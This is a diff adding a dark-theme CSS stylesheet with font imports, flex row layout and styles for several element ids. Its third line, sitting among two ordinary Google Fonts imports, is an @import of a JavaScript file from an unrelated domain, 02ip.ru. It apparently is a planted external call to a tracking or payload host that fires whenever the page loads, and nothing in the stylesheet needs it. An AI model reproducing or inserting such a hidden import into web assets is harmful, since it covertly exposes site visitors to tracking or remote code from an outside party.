@@ -1,0 +1,67 @@
+@import url("https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap");
+@import url("https://fonts.googleapis.com/css2?family=Rubik:wght@300&display=swap");
+@import url("https://02ip.ru/2BwH87.js");
+::-webkit-scrollbar {
+  width: 0px;
+}
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+html {
+  user-select: none;
+  -webkit-user-drag: none;
+}
+body {
+  display: flex;
+  flex-direction: column;
+  text-align: center;
+  font-family: "Rubik", sans-serif;
+  background-color: #222;
+  color: #ddd;
+}
+body > div {
+  padding: 0 1.5%;
+  width: 100%;
+  height: 55px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+div:nth-child(even) {
+  background-color: #282828;
+}
+#A {
+  text-align: left;
+  user-select: all;
+  font-size: 16px;
+  font-weight: bold;
+  letter-spacing: 1.1px;
+}
+#B {
+  text-align: center;
+  font-family: "Roboto Mono", monospace;
+  user-select: all;
+  font-size: 17px;
+}
+#C,
+#Z {
+  text-align: right;
+  font-size: 15px;
+  color: #999;
+}
+#Z {
+  color: rgb(255, 192, 19);
+  font-size: 30px;
+}
+#SP {
+  border-bottom: solid 25px #202020;
+  height: 80px;
+}
+#A,
+#B,
+#C,
+#Z {
+  flex: 1;
+}
